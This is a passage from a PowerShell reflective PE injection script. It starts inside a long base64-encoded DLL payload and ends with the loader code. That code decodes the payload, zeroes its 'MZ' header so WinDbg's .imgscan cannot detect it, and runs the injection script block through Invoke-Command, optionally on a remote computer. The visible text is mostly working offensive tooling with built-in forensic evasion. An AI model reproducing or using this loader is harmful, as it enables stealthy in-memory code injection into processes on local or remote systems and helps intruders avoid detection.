AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABgAAAAYAACAAAAAAAAAAAAAAAAAAAABAAIAAAAwAACAAAAAAAAAAAAAAAAAAAABAAkEAABIAAAAYJABAJEAAAAAAAAAAAAAAAAAAAAAAAAAPD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnIHN0YW5kYWxvbmU9J3llcyc/Pg0KPGFzc2VtYmx5IHhtbG5zPSd1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MScgbWFuaWZlc3RWZXJzaW9uPScxLjAnPg0KPC9hc3NlbWJseT4NCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAJAEAACiiMKJQoliiYKJ4ooCiiKK4osCiyKLQotii4KLoovCi+KIAowijEKMYoyCjKKMwozijQKNIo1CjWKNgo2ijcKN4o4CjiKOQo5ijoKOoo7CjuKPAo8ij0KPYo+Cj6KPwo/ijAKQIpBCkGKQgpCikMKQ4pECkSKRQpFikYKRopHCkeKSApIikkKSYpKCkqKSwpLikwKTIpNCk2KTgpOik8KT4pAClCKUQpRilIKUopTClOKVApUilUKVYpWClaKVwpXilgKWIpZClmKWgpailsKW4pcClyKXQpdil4KXopfCl+KUAppisoKyorPCuAK8QrxivIK8orzCvOK9Ar0ivWK9gr2ivcK94r4CviK+Qr6ivuK/Ir9Cv2K/gr+ivANAAAOgAAABYoWChaKFwocChyKHQodih4KHoofCh+KEAogiiEKIYoiCiKKIwojiiQKJIolCiWKJgp2incKd4p4CniKeQp5inoKeop7CnuKfAp8in0KfYp+Cn6Kfwp/inAKgIqBCoGKggqCioMKg4qECoSKhQqFioYKhoqHCoeKiAqIiokKiYqKCoqKiwqMCoyKjQqNio4KjoqPCo+KgAqQipEKkYqSCpKKkwqTipQKlIqVCpWKlgqWipcKl4qYCpiKmQqZipoKmoqbCpuKnAqcip0KnYqeCp6KnwqfipAKoIqhCqGKoAAADgAACMAQAA6KP4owikGKQopDikSKRYpGikeKSIpJikqKS4pMik2KTopPikCKUYpSilOKVIpVilaKV4pYilmKWopbilyKXYpeil+KUIphimKKY4pkimWKZopnimiKaYpqimuKbIptim6Kb4pginGKcopzinSKdYp2ineKeIp5inqKe4p8in2Kfop/inCKgYqCioOKhIqFioaKh4qIiomKioqLioyKjYqOio+KgIqRipKKk4qUipWKloqXipiKmYqaipuKnIqdip6Kn4qQiqGKooqjiqSKpYqmiqeKqIqpiqqKq4qsiq2KroqviqCKsYqyirOKtIq1iraKt4q4irmKuoq7iryKvYq+ir+KsIrBisKKw4rEisWKxorHisiKyYrKisuKzIrNis6Kz4rAitGK0orTitSK1YrWiteK2IrZitqK24rcit2K3orfitCK4YriiuOK5IrliuaK54roiumK6orriuyK7Yruiu+K4IrxivKK84r0ivWK9or3iviK+Yr6ivuK/Ir9iv6K/4rwDwAACEAAAACKAYoCigOKBIoFigaKB4oIigmKCooLigyKDYoOig+KAIoRihKKE4oUihWKFooXihiKGYoaihuKHIodih6KH4oQiiGKJArlCuYK5wroCukK6grrCuwK7QruCu8K4ArxCvIK8wr0CvUK9gr3CvgK+Qr6CvsK/Ar9Cv4K/wrwAAAQCYAQAAAKAQoCCgMKBAoFCgYKBwoICgkKCgoLCgwKDQoOCg8KAAoRChIKEwoUChUKFgoXChgKGQoaChsKHAodCh4KHwoQCiEKIgojCiQKJQomCicKKAopCioKKwosCi0KLgovCiAKMQoyCjMKNAo1CjYKNwo4CjkKOgo7CjwKPQo+Cj8KMApBCkIKQwpECkUKRgpHCkgKSQpKCksKTApNCk4KTwpAClEKUgpTClQKVQpWClcKWApZCloKWwpcCl0KXgpfClAKYQpiCmMKZAplCmYKZwpoCmkKagprCmwKbQpuCm8KYApxCnIKcwp0CnUKdgp3CngKeQp6CnsKfAp9Cn4KfwpwCoEKggqDCoQKhQqGCocKiAqJCooKiwqMCo0KjgqPCoAKkQqSCpMKlAqVCpYKlwqYCpkKmgqbCpwKnQqeCp8KkAqhCqIKowqkCqUKpgqnCqgKqQqqCqsKrAqtCq4KrwqgCrEKsgqzCrQKtQq2CrcKuAq5CroKuwq8Cr0Kvgq/CrAKwQrCCsMKxArFCsYKxwrAAwAQAQAAAA2KLwoviiAAAAUAEARAAAAJCl2KX4pRimOKZYpoimoKaoprCm6KbwphCoGKggqCioMKg4qECoSKhQqFioaKhwqHiogKiIqJComKigqAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
	$PEBytes = [Convert]::FromBase64String($MsgBox64Dll);
    #Verify the image is a valid PE file
    $e_magic = ($PEBytes[0..1] | ForEach-Object {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    if (-not $DoNotZeroMZ) {
        # Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
        # TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
        $PEBytes[0] = 0
        $PEBytes[1] = 0
    }

    #Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
    if ($ExeArgs -ne $null -and $ExeArgs -ne '')
    {
        $ExeArgs = "ReflectiveExe $ExeArgs"
    }
    else
    {
        $ExeArgs = "ReflectiveExe"
    }

    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
    }
    else
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
    }
}

Main
}